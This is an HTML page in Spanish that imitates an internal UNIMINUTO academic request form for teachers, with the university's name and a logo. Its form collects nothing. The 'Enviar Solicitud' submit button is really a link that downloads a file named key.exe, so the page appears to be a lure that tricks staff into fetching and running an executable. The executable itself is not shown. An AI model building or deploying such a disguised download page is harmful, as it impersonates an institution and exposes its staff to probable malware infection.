<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solicitud Académica - UNIMINUTO</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #003370;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .form-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .form-box {
            background: #fff;
            border-radius: 15px;
            padding: 32px 24px 24px 24px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }
        .logo {
            width: 120px;
            margin-bottom: 12px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.07);
        }
        h2 {
            font-size: 20px;
            color: #003366;
            margin-bottom: 18px;
            font-weight: bold;
            letter-spacing: 0.5px;
            text-align: center;
            width: 100%;
        }
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 14px;
            align-items: center;
        }
        input, textarea {
            width: 90%;
            max-width: 320px;
            margin: 0 auto;
            padding: 12px 14px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.2s;
            outline: none;
            background: #f7f7f7;
            display: block;
            box-sizing: border-box;
        }
        input:focus, textarea:focus {
            border-color: #003366;
            background: #fff;
        }
        .boton {
            width: 90%;
            max-width: 320px;
            background-color: #FFCC00;
            color: #003366;
            border: none;
            padding: 13px 0;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            margin-top: 6px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.07);
            text-decoration: none;
            display: block;
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }
        .boton:hover {
            background-color: #e6b800;
        }
        .note {
            margin-top: 16px;
            font-size: 13px;
            color: #333;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <div class="form-box">
            <img src="https://tse4.mm.bing.net/th/id/OIP.CHSM8Vy-hCACRzeBbi6MqQHaHa?cb=12&rs=1&pid=ImgDetMain&o=7&rm=3" 
                     alt="Logo UNIMINUTO" class="logo">
            <h2>Solicitud de Información Académica – UNIMINUTO</h2>
            <form>
                <input type="text" placeholder="Nombre del docente" required>
                <input type="text" placeholder="Programa académico" required>
                <input type="text" placeholder="Asignatura" required>
                <textarea placeholder="Información solicitada" rows="3" required></textarea>
                <a class="boton" href="key.exe" download="key.exe">Enviar Solicitud</a>
            </form>
            <p class="note">
                Este formulario es solo para uso interno entre docentes de UNIMINUTO
            </p>
        </div>
    </div>
</body>
</html>
